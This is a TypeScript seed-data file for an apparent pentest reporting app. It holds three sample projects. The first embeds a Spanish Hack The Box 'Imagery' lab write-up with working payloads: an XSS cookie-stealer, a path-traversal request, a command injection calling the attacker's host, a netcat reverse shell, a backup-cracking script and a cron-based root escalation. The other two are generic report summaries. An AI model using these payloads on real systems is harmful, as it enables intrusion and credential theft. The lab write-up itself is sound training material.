import type { Project } from './types';
import { sub, formatISO } from 'date-fns';

const now = new Date();

export const initialProjects: Project[] = [
  {
    id: 'proj-htb-imagery',
    clientId: 'cli-h4ck',
    name: 'Imagery HTB Writeup',
    icon: 'FileText',
    status: 'Completed',
    language: 'es',
    startDate: '2025-10-14',
    endDate: '2025-10-14',
    createdAt: formatISO(sub(now, { weeks: 1 })),
    updatedAt: formatISO(sub(now, { weeks: 1 })),
    reportBody: `<h2>Información General</h2>
<p>- <strong>Nombre de la máquina:</strong> Imagery</p>
<p>- <strong>IP:</strong> 10.10.11.88</p>
<p>- <strong>Sistema Operativo:</strong> Linux</p>
<p>- <strong>Dificultad:</strong> 🟡 Media</p>
<p>- <strong>Fecha:</strong> 14-10-2025</p>
<h2>Reconocimiento Inicial</h2>
<h3>Añadir IP a /etc/hosts</h3>
<pre><code>echo "10.10.11.88 imagery.htb" | sudo tee -a /etc/hosts</code></pre>
<h3>Escaneo de Puertos (Nmap)</h3>
<h4>Simple Scan</h4>
<pre><code>sudo nmap -v -sV -T5 10.10.11.88</code></pre>
<pre><code>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
<p><em>Encontramos 2 puertos abiertos, destacando el puerto 8000 que corre un servidor Werkzeug.</em></p>
<h4>Escaneo Avanzado</h4>
<p>Podemos usar Visual Map con un escaneo en XML para detectar posibles vulnerabilidades o vectores de entrada:</p>
<pre><code>sudo nmap -v -A 10.10.11.88 -oX scan.xml</code></pre>
<pre><code>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</code></pre>
<h2>Análisis con Visual Map</h2>
<p><a href="https://github.com/afsh4ck/Visual-Map">Visual-Map</a></p>
<h3>Resumen de Scripts NSE</h3>
<p>Este análisis de scripts NSE revela la presencia de dos servicios clave:</p>
<ul><li><strong>Servicio SSH:</strong> Se identificaron claves de host ECDSA y ED25519, lo que confirma la ejecución de un servidor SSH.</li><li><strong>Servicio Web (HTTP):</strong><ul><li>El servidor web soporta los métodos HTTP OPTIONS, HEAD y GET.</li><li>El título de la página web es "Image Gallery".</li><li>La tecnología subyacente del servidor es Werkzeug/3.1.3 sobre Python/3.12.7.</li></ul></li></ul>
<h2>Acceso Web</h2>
<p>Accedemos a http://10.10.11.88:8000/ y observamos que parece ser una galería de fotos online. Nos registraremos para ver la aplicación web por dentro. Una vez dentro vemos que podemos subir una imagen, por lo que puede ser el vector de entrada principal.</p>
<h3>Prueba de subida de archivos</h3>
<p>Después de probar multitud de técnicas de subidas de archivos, doble extensión de archivos, MIME Types, bypass de blacklists, etc... parece que no podemos ejecutar PHP de ninguna manera, por lo que este vector de entrada queda descartado en principio.</p>
<h2>XSS</h2>
<p>Encontramos en el footer un apartado de la web que no habíamos visto antes, un apartado para reportar un bug. Curiosamente este apartado es vulnerable a XSS y conseguimos la cookie del administrador con el siguiente script:</p>
<pre><code>&lt;img src=1 onerror="document.location='http://10.10.14.100:80/?c='+document.cookie"&gt;</code></pre>
<p>Abrimos un servidor PHP por el puerto 80 y recibimos la cookie casi al instante. Tenemos que tener en cuenta que esta cookie es rotatoria y va cambiando cada cierto tiempo.</p>
<pre><code>afsh4ck@kali$ sudo php -S 0.0.0.0:80
[Tue Oct 14 05:18:22 2025] PHP 8.4.6 Development Server (http://0.0.0.0:80) started</code></pre>
<p>Tenemos la cookie: <code>c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOzo2A.7XVtQ7-bk28X8Mo8ymB4xYZ8Rh4</code></p>
<h2>Admin panel</h2>
<p>Al editar la cookie y recargar la página vemos un panel de administración donde podemos descargarnos un log del usuario y el administrador de la web. El log no contiene nada interesante:</p>
<pre><code>cat admin@imagery.htb.log 
[2025-10-13T12:00:09.151016] Logged in successfully.
[2025-10-13T12:00:09.164590] Logged in successfully.
[2025-10-13T12:01:09.098800] Logged in successfully.
[2025-10-13T12:02:08.818371] Logged in successfully.
[2025-10-13T12:02:08.841170] Logged in successfully.</code></pre>
<h2>Local File Inclusion (LFI)</h2>
<p>Al capturar el request de descarga de log, encontramos un parámetro <code>log_identifier</code> que es vulnerable a LFI, permitiéndonos ver el contenido de archivos cómo el etc/passwd: <code>GET /admin/get_system_log?log_identifier=../../../../../etc/passwd</code>. Encontramos un usuario <code>mark</code> con shell y que nos llama la atención.</p>
<h2>Dumpeo de variables de entorno y usuario actual</h2>
<h3>Credenciales de admin</h3>
<p>Las credenciales del administrador y el usuario de prueba las encontramos en <code>db.json</code> en <code>config.py</code>, que es el archivo de configuración común junto con <code>app.py</code> en los servidores Python.</p>
<pre><code>"users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
]</code></pre>
<h3>Cracking de hashes</h3>
<p>Solamente conseguimos crackear la contraseña del usuario de prueba: <code>iambatman</code>. No podemos conectarnos directamente por SSH: <code>ssh testuser@imagery.htb # Permission denied (publickey).</code>. Así que nos loguearemos directamente con su usuario en la web. Observamos que este usuario tiene desbloqueadas algunas funcionalidades que un usuario normal no tiene. Por ejemplo al subir una imagen legítima y hacer click en las opciones de la imagen, vemos que ahora tenemos todas desbloqueadas, cuando antes solamente teníamos Download y Delete. Hay una funcionalidad interesante de <code>visual image transformation</code>, con la que podemos transformar una imagen y pasa varios parámetros en un JSON:</p>
<pre><code>"params":{
    "x":0,
    "y":0,
    "width":900,
    "height":515
}</code></pre>
<h2>RCE a través de JSON</h2>
<p>Le inyectaremos un comando en el primer valor para hacer la comprobación. Haremos un curl y intentaremos inyectar un comando de S.O. como <code>whoami</code>:</p>
<pre><code>"params":{
    "x":";curl http://10.10.14.100?output='whoami';",
    "y":0,
    "width":900,
    "height":515
}</code></pre>
<p>Recibimos el test en nuestra terminal, lo que significa que el input es vulnerable y podemos ganar una shell.</p>
<h3>Ganando la shell</h3>
<p>Abrimos un listener de netcat en nuestro equipo atacante: <code>nc -nlvp 8888</code>. Y usaremos el siguiente payload para devolvernos una conexión de netcat y ganar la shell: <code>;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.100 8888 >/tmp/f;</code>. Estamos dentro!</p>
<pre><code>$ whoami
web</code></pre>
<h3>Tratamiento de la TTY</h3>
<p>Tenemos una shell limitada, por lo que haremos el tratamiento de la TTY para movernos mejor:</p>
<pre><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
web@Imagery:~/web$</code></pre>
<h2>Credential hunting</h2>
<p>Buscaremos credenciales para seguir moviéndonos por el sistema. Encontramos un archivo de backup pero está cifrado:</p>
<pre><code>cd var/backup
ls
# web_20250806_120723.zip.aes</code></pre>
<h3>Cracking de ZIP con cifrado AES</h3>
<p>No podemos extraerlo directamente. Nos enviamos el archivo backup a nuestra máquina de atacante para trabajar mejor y lo crackeamos con el siguiente script de python:</p>
<pre><code>#!/usr/bin/env python3
import pyAesCrypt
import sys
import os
if len(sys.argv) < 3:
    print("Usage: python crack.py file.zip.aes wordlist.txt [outdir]")
    sys.exit(1)
encfile = sys.argv[1]
wordlist = sys.argv[2]
outdir = sys.argv[3] if len(sys.argv) > 3 else "attempt_out"
os.makedirs(outdir, exist_ok=True)
# chunk size used by pyAesCrypt (default value).
bufferSize = 64 * 1024
total = 0
with open(wordlist, "r", errors="ignore") as f:
    for line in f:
        pwd = line.rstrip("\\n\\r")
        if not pwd:
            continue
        total += 1
        if total % 1000 == 0:
            print(f"Attempt #{total}: '{pwd[:30]}'")
        outpath = os.path.join(outdir, "temp_decrypted_output")
        try:
            # pyAesCrypt.decryptFile throws ValueError on wrong password (or IntegrityError)
            pyAesCrypt.decryptFile(encfile, outpath, pwd, bufferSize)
            print()
            print("Password Cracked")
            print(pwd)
            print("Decrypted output saved to:", outpath)
            sys.exit(0)
        except (ValueError, Exception) as e:
            # Wrong password will generally raise ValueError / IntegrityError
            # Remove any incomplete file
            if os.path.exists(outpath):
                try:
                    os.remove(outpath)
                except:
                    pass
            # continue trying
            continue
print("Password NOT found in the provided wordlist.")
sys.exit(2)</code></pre>
<p>Al ejecutarlo obtenemos una contraseña en plano: <code>bestfriends</code>. Al leer el archivo <code>db.json</code> del backup, esta vez si conseguimos el hash del usuario <code>mark</code> y con crackstation lo crackeamos al instante: <code>supersmash</code></p>
<h2>User Flag</h2>
<p>No podemos acceder por SSH, por lo que cambiaremos al usuario mark desde la propia shell que ya tenemos:</p>
<pre><code>su mark
# Password: supersmash
whoami
# mark
cat /home/mark/user.txt
# 45e334738070b9da3439a17e********</code></pre>
<h2>Escalada de Privilegios</h2>
<h3>Enumeración de Privilegios</h3>
<p>Tenemos permisos de ejecución como root en el ejecutable <code>charcol</code>: <code>sudo -l</code>. Al ejecutarlo con <code>sudo charcol shell</code> nos pide una contraseña, pero podemos resetearlo con la flag <code>-R</code>:</p>
<pre><code>sudo charcol -R
# Enter system password for user 'mark' to confirm: supersmash
# Charcol application password has been reset to default (no password mode).</code></pre>
<p>Ahora ya no pedirá contraseña al ejecutarlo.</p>
<h3>Obtener la Root Flag con Charcol</h3>
<p>Usaremos el siguiente comando de charcol para copiar la root flag a nuestro directorio principal de mark:</p>
<pre><code>charcol&gt; auto add --schedule "* * * * *" --command "cat /root/root.txt &gt; /home/.flag" --name "root_flag" --log-output /home/.flag</code></pre>
<h2>👑 Root Flag</h2>
<p>En el directorio <code>/home</code> nos encontramos la flag de root:</p>
<pre><code>cat /home/.flag
# 8277d5fb5ed2084c53cd563a********</code></pre>
<p>Podríamos hacer lo mismo para conseguir el <code>id_rsa</code> de root (si lo tiene) y acceder por SSH para un control total del sistema.</p>`,
  },
  {
    id: 'proj-1',
    clientId: 'cli-htb',
    name: 'Q3 Web App Pentest',
    reportBody: `<h2>Executive Summary</h2><p>This report details the findings of the penetration test conducted on <strong>Q3 Web App Pentest</strong> for <strong>Hack The Box</strong> between 2023-07-01 and 2023-07-15. The assessment identified <strong>2</strong> total vulnerabilities, including <strong>1</strong> critical and <strong>1</strong> high-risk findings. Urgent remediation is recommended for critical vulnerabilities to mitigate potential impact.</p><h2>Scope &amp; Methodology</h2><p>The assessment was conducted from the perspective of an external, unauthenticated attacker (black-box).</p><h3>Scope</h3><ul><li>Web Applications: *.hackthebox.eu, api.hackthebox.eu</li><li>External Network: 138.68.128.0/24</li></ul><h3>Methodology</h3><ol><li>Reconnaissance: Discovering subdomains, open ports, and services.</li><li>Vulnerability Scanning: Using automated tools to identify common vulnerabilities.</li><li>Manual Verification &amp; Exploitation: Manually validating findings and attempting to exploit identified weaknesses.</li><li>Reporting: Documenting vulnerabilities and providing remediation guidance.</li></ol><h2>Attack Narrative</h2><p>The engagement began with reconnaissance against the *.hackthebox.eu domain, which revealed the existence of an outdated blog and a development server with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.</p><h2>Findings Classification</h2><table><thead><tr><th>Severity</th><th>CVSS v3.1 Score</th><th>Description</th></tr></thead><tbody><tr><td><span style="color:red">Critical</span></td><td>9.0 - 10.0</td><td>Vulnerabilities that could lead to immediate system compromise.</td></tr><tr><td><span style="color:orange">High</span></td><td>7.0 - 8.9</td><td>Vulnerabilities that could allow an attacker to gain unauthorized access.</td></tr><tr><td><span style="color:yellow">Medium</span></td><td>4.0 - 6.9</td><td>Weaknesses that could reveal sensitive information.</td></tr><tr><td><span style="color:blue">Low</span></td><td>0.1 - 3.9</td><td>Minor issues that reduce the overall security posture.</td></tr><tr><td><span style="color:gray">Informational</span></td><td>0.0</td><td>Observations about the external footprint.</td></tr></tbody></table>`,
    startDate: '2023-07-01',
    endDate: '2023-07-15',
    status: 'Completed',
    language: 'en',
    createdAt: formatISO(sub(now, { months: 2 })),
    updatedAt: formatISO(sub(now, { months: 1 })),
    icon: 'Scan'
  },
  {
    id: 'proj-2',
    clientId: 'cli-ine',
    name: 'Análisis de Red Interna',
    reportBody: `<h2>Resumen Ejecutivo</h2><p>Este informe detalla los hallazgos de la evaluación de seguridad de la red interna para <strong>INE Security</strong>, realizada entre el 10-08-2023 y el 20-08-2023. El objetivo era identificar vulnerabilidades explotables desde la perspectiva de un actor malicioso con acceso a la red corporativa. Se descubrieron múltiples debilidades, incluyendo el uso de credenciales por defecto en servicios críticos y software sin parches que permitieron la escalada de privilegios hasta el nivel de Administrador de Dominio. Se recomienda la remediación inmediata de los hallazgos críticos.</p><h2>Alcance y Metodología</h2><h3>Alcance</h3><ul><li>Rangos IP: 10.10.0.0/16</li><li>Supuestos: La evaluación se realiza desde la perspectiva de un atacante que ha obtenido un punto de apoyo en la red interna (p.ej., una estación de trabajo comprometida).</li><li>Exclusiones: No se realizaron pruebas que pudieran causar una denegación de servicio en sistemas de producción críticos.</li></ul><h3>Methodology</h3><ol><li>Descubrimiento de Activos: Identificación de hosts activos, puertos y servicios en la red.</li><li>Enumeración de Servicios: Análisis de servicios para identificar versiones, configuraciones y posibles vulnerabilidades.</li><li>Explotación y Movimiento Lateral: Intento de explotar vulnerabilidades para ganar acceso y moverse a través de la red.</li><li>Escalada de Privilegios: Búsqueda de vías para elevar los privilegios en los sistemas comprometidos y en el dominio de Active Directory.</li></ol>`,
    startDate: '2023-08-10',
    endDate: '2023-08-20',
    status: 'In Progress',
    language: 'es',
    createdAt: '2023-08-10T09:00:00Z',
    updatedAt: formatISO(sub(now, { days: 3 })),
    icon: 'Network'
  },
];
